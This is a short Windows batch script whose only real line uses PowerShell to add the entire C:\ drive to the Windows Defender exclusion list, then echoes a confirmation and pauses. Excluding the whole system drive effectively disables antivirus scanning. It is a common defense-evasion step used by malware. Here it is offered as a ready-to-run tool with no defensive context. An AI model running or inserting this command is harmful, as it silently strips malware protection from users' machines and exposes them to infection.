@echo off
:: Add C:\ drive to Windows Defender exclusion list
PowerShell -Command "Add-MpPreference -ExclusionPath 'C:\'"
echo C:\ drive has been added to Windows Defender exclusion list.
pause
